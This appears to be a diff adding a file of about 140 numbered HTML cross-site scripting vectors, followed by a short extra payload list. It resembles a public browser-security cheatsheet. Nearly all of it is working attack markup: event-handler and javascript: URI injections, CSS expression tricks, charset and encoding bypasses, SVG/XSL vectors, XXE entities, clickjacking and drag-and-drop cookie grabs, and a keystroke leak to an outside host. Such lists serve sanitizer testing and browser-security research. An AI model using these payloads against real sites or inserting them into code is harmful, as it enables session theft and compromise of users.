+<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
+<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
+<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div>
+<div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
+<![><img src="]><img src=x onerror=alert(39)//">
+<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
+<div id="41"><li style=list-style:url() onerror=alert(41)></li>
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
+<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
+<div id="43"><?xml version="1.0" standalone="no"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head>
+<body>Hello</body>
+</html>//["'`-->]]>]</div>
+<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
+<div id="53"><xml id="xss" src="test.htc"></xml>
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
+<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>
+<div id="62"><!-- IE 6-8 -->
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+<!-- IE 6-9 -->
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
+<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
+<img src="javascript:alert(2)">
+<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
+<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
+<div id="66"><?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+<root/>//["'`-->]]>]</div>
+<div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["'`-->]]>]</div>
+<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">   <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x></doc>//["'`-->]]>]</div>
+<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
+<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
+<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>
+<div id="87"><svg xmlns="http://www.w3.org/2000/svg">
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
+</svg>//["'`-->]]>]</div>
+<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<animation xlink:href="javascript:alert(88)"/>
+<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<foreignObject xlink:href="javascript:alert(88)"/>
+<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>
+</svg>//["'`-->]]>]</div>
+<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
+<set attributeName="onmouseover" to="alert(89)"/>
+<animate attributeName="onunload" to="alert(89)"/>
+</svg>//["'`-->]]>]</div>
+<div id="90"><!-- Up to Opera 10.63 -->
+<div style=content:url(test2.svg)></div>
+<!-- Up to Opera 11.64 - see link below -->
+<!-- Up to Opera 12.x -->
+<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
+<div id="91">[A]
+<? foo="><script>alert(91)</script>">
+<! foo="><script>alert(91)</script>">
+</ foo="><script>alert(91)</script>">
+<? foo="><x foo='?><script>alert(91)</script>'>">
+<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
+<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
+<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
+<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
+<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
+</svg>//["'`-->]]>]</div>
+<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage>
+</svg>//["'`-->]]>]</div>
+<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
+<div id="97"><!-- IE 5-9 -->
+<div id=d><x xmlns="><iframe onload=alert(97)"></div>
+<script>d.innerHTML+='';</script>
+<!-- IE 10 in IE5-9 Standards mode -->
+<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+<div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
+<div id="99">XXX<style>
+*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+<!--
+--><!--*{color:red}   /* all UA */
+*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */
+</style>//["'`-->]]>]</div>
+<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
+<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
+<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
+</svg>//["'`-->]]>]</div>
+<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+<div id="108"><!-- IE 5-8 standards mode -->
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
+<!-- IE 5-9 standards mode -->
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
+<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
+</svg>//["'`-->]]>]</div>
+<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
+<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
+</svg>//["'`-->]]>]</div>
+<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+<div id="113"><div id="x">XXX</div>
+<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div>
+<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
+<div id="115"><!--[if]><script>alert(115)</script -->
+<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
+<div id="116"><div id="x">x</div>
+<xml:namespace prefix="t">
+<import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>
+<div id="117"><a href="http://attacker.org">
+<iframe src="http://example.org/"></iframe>
+</a>//["'`-->]]>]</div>
+<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div>
+<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
+<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
+<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
+<div id="120"><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script>
+<body><a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
+xmlns:svg="http://www.w3.org/2000/svg">
+<body style="background:gray">
+<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
+<svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body>
+</html>//["'`-->]]>]</div>
+<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
+<div id="123"><span class=foo>Some text</span>
+<a class=bar href="http://www.example.org">www.example.org</a>
+<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+<script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>//["'`-->]]>]</div>
+<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
+<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+<div id="125"><?xml version="1.0"?>
+<?xml-stylesheet type="text/xml" href="#stylesheet"?>
+<!DOCTYPE doc [
+<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
+<svg xmlns="http://www.w3.org/2000/svg">
+<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template></xsl:stylesheet><circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
+<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
+<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
+<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
+<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
+<handler id="y">alert(127)</handler>
+</svg>//["'`-->]]>]</div>
+<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
+<div id="129"><svg>
+<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
+</svg>//["'`-->]]>]</div>
+<div id="130"><math href="javascript:alert(130)">CLICKME</math>
+<math>
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
+<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
+</math>//["'`-->]]>]</div>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+<br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
+<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>
+<div id="132"><!doctype html>
+<form>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
+<input name="secret" type="password">
+</form>
+<!-- injection --><svg height="50px">
+<image xmlns:xlink="http://www.w3.org/1999/xlink">
+<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
+</image>
+</svg>//["'`-->]]>]</div>
+<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
+<div id="134"><xmp>
+<%
+</xmp>
+<img alt='%></xmp><img src=xx:x onerror=aler
+*{color:red}</style>//["'`-->]]>]</div>
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+<template match="/">
+<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
+<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
+</template>
+</stylesheet>//["'`-->]]>]</div>
+<div id="136"><form action="" method="post">
+<input name="username" value="admin" />
+<input name="password" type="password" value="secret" />
+<input name="injected" value="injected" dirname="password" />
+<input type="submit">
+</form>//["'`-->]]>]</div>
+<div id="137"><svg>
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+<circle r="400"></circle>
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
+</a>//["'`-->]]>]</div>
+<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<marquee loop=1 width=0 onfinish=alert(1)>
+<marguee/onstart=alert(1)>
+<svg onload=(alert)(1)>
+<script>$=1,alert($)</script>
+<form><button formaction="javascript:alert(1)">
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
